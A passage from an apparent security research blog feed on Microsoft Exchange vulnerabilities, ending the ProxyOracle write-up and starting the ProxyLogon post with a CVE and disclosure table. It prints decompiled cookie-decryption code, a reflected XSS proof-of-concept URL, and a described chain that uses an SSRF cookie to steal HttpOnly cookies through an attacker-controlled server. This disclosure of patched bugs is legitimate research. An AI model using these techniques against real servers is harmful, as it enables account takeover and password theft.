    &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AesCryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICryptoTransform&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoTransform2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CreateDecryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoTransform2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;TransformFinalBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CryptographicException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CryptographicException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[FbaModule::ParseCadataCookies] Received CryptographicException {0} transforming auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AppendToLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;CryptoError=PossibleSSLCertrolloverMismatch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FormatException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FormatException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[FbaModule::ParseCadataCookies] Received FormatException {0} decoding caData auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AppendToLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;DecodeError=InvalidCaDataAuthCookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Unicode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It should be noted that since the IV is encrypted with the SSL certificate private key, we canâ€™t recover the first block of the ciphertext through XOR. But it wouldnâ€™t cause any problem for us because the C# internally processes the strings as UTF-16, so the first 12 bytes of the ciphertext must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B\x00a\x00s\x00i\x00c\x00 \x00&lt;/code&gt;. With one more Base64 encoding applied, we will only lose the first 1.5 bytes in the username field.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(16âˆ’6Ã—2) Ã· 2 Ã— (3/4) = 1.5&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;the-exploit&quot;&gt;The Exploit&lt;/h1&gt;

&lt;p&gt;As of now, we have a Padding Oracle that allows us to decrypt any userâ€™s cookie. BUT, how can we get the client cookies? Here we find another vulnerability to chain them together.&lt;/p&gt;

&lt;h2 id=&quot;xss-to-steal-client-cookies&quot;&gt;XSS to Steal Client Cookies&lt;/h2&gt;

&lt;p&gt;We discover an XSS (CVE-2021-31195) in the CAS Frontend (Yeah, CAS again) to chain together, the root cause of this XSS is relatively easy: Exchange forgets to sanitize the data before printing it out so that we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; to escape from the JSON format and inject arbitrary JavaScript code.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://exchange/owa/auth/frowny.aspx
?app=people
&amp;amp;et=ServerError
&amp;amp;esrc=MasterPage
&amp;amp;te=\
&amp;amp;refurl=}}};alert(document.domain)//
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But here comes another question: all the sensitive cookies are protected by the HttpOnly flag, which makes us unable to access the cookies by JavaScript. WHAT SHOULD WE DO?&lt;/p&gt;

&lt;h2 id=&quot;bypass-the-httponly&quot;&gt;Bypass the HttpOnly&lt;/h2&gt;

&lt;p&gt;As we could execute arbitrary JavaScript on browsers, why donâ€™t we just insert the SSRF cookie we used in ProxyLogon? Once we add this cookie and assign the Backend target value as our malicious server, Exchange will become a proxy between the victims and us. We can then take over all the clientâ€™s HTTP static resources and get the protected HttpOnly cookies!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By chaining bugs together, we have an elegant exploit that can steal any userâ€™s cookies by just sending him/her a malicious link. Whatâ€™s noteworthy is that the XSS here is only helping us to steal the cookie, which means all the decryption processes wouldnâ€™t require any authentication and user interaction. Even if the user closes the browser, it wouldnâ€™t affect our Padding Oracle Attack!&lt;/p&gt;

&lt;p&gt;Here is the &lt;a href=&quot;https://www.youtube.com/watch?v=VuJvmJZxogc&quot;&gt;demonstration video&lt;/a&gt; showing how we recover the victimâ€™s password:&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/VuJvmJZxogc&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;!-- # The Timeline

* --&gt;
</description>
                <link>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/</link>
                <guid>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle</guid>
                <pubDate>Fri, 06 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 1 - ProxyLogon!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.6em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;The series of A New Attack Surface on MS Exchange:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Microsoft Exchange, as one of the most common email solutions in the world, has become part of the daily operation and security connection for governments and enterprises. This January, we reported a series of vulnerabilities of Exchange Server to Microsoft and named it as &lt;a href=&quot;https://proxylogon.com/&quot;&gt;ProxyLogon&lt;/a&gt;. ProxyLogon might be the most severe and impactful vulnerability in the Exchange history ever. If you were paying attention to the industry news, you must have heard it.&lt;/p&gt;

&lt;p&gt;While looking into ProxyLogon from the architectural level, we found it is not just a vulnerability, but an attack surface that is totally new and no one has ever mentioned before. This attack surface could lead the hackers or security researchers to more vulnerabilities. Therefore, we decided to focus on this attack surface and eventually found at least 8 vulnerabilities. These vulnerabilities cover from server side, client side, and even crypto bugs. We chained these vulnerabilities into 3 attacks:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ProxyLogon: The most well-known and impactful Exchange exploit chain&lt;/li&gt;
  &lt;li&gt;ProxyOracle: The attack which could recover any password in plaintext format of Exchange users&lt;/li&gt;
  &lt;li&gt;ProxyShell: The exploit chain we demonstrated at &lt;a href=&quot;https://twitter.com/thezdi/status/1379467992862449664&quot;&gt;Pwn2Own 2021&lt;/a&gt; to take over Exchange and earn $200,000 bounty&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I would like to highlight that all vulnerabilities we unveiled here are logic bugs, which means they could be reproduced and exploited more easily than any memory corruption bugs. We have presented our research at &lt;a href=&quot;https://www.blackhat.com/us-21/briefings/schedule/index.html#proxylogon-is-just-the-tip-of-the-iceberg-a-new-attack-surface-on-microsoft-exchange-server-23442&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-29/dc-29-speakers.html&quot;&gt;DEFCON&lt;/a&gt;, and won the Best Server-Side bug of &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;Pwnie Awards 2021&lt;/a&gt;. You can check our presentation materials here:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! &lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf&quot;&gt;[Slides]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=5mqid-7zp8k&quot;&gt;[Video]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By understanding the basics of this new attack surface, you wonâ€™t be surprised why we can pop out 0days easily!&lt;/p&gt;

&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;

&lt;p&gt;I would like to state that all the vulnerabilities mentioned have been reported via the responsible vulnerability disclosure process and patched by Microsoft. You could find more detail of the CVEs and the report timeline from the following table.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Report Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CVE&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Patch Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CAS&lt;sup&gt;[1]&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Reported By&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473&quot;&gt;CVE-2021-34473&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523&quot;&gt;CVE-2021-34523&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207&quot;&gt;CVE-2021-31207&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai and Dlive&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div style=&quot;font-size:0.6em; line-height: 1.6;&quot;&gt;
&lt;br /&gt;&lt;em&gt;[1] Bugs relate to this new attack surface direclty&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;[2] Pwn2Own 2021 bugs&lt;/em&gt;
&lt;/div&gt;

&lt;p&gt;Why did Exchange Server become a hot topic? From my point of view, the whole ProxyLogon attack surface is actually located at an early stage of Exchange request processing. For instance, if the entrance of Exchange is 0, and 100 is the core business logic, ProxyLogon is somewhere around 10. Again, since the vulnerability is located at the beginning place, I believe anyone who has reviewed the security of Exchange carefully would spot the attack surface. This was also &lt;a href=&quot;https://twitter.com/orange_8361/status/1346401788811825153&quot;&gt;why I tweeted my worry&lt;/a&gt; about bug collision after reporting to Microsoft. The vulnerability was so impactful, yet itâ€™s a simple one and located at such an early stage.&lt;/p&gt;

&lt;p&gt;You all know what happened next, Volexity found that an APT group was leveraging the same SSRF (&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;) to access usersâ€™ emails in early January 2021 and reported to Microsoft. Microsoft also released the urgent patches in March. From the &lt;a href=&quot;https://youtu.be/rB255D-wnw0?t=999&quot;&gt;public information&lt;/a&gt; released afterwards, we found that even though they used the same SSRF, the APT group was exploiting it in a very different way from us. We completed the ProxyLogon attack chain through &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;, while the APT group used EWS and two unknown vulnerabilities in their attack. This has convinced us that there is a bug collision on the SSRF vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/1.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;&lt;small&gt;Image from &lt;a href=&quot;https://www.microsoft.com/security/blog/2021/03/25/analyzing-attacks-taking-advantage-of-the-exchange-server-vulnerabilities/&quot;&gt;Microsoft Blog&lt;/a&gt;&lt;/small&gt;&lt;/em&gt;&lt;/p&gt;

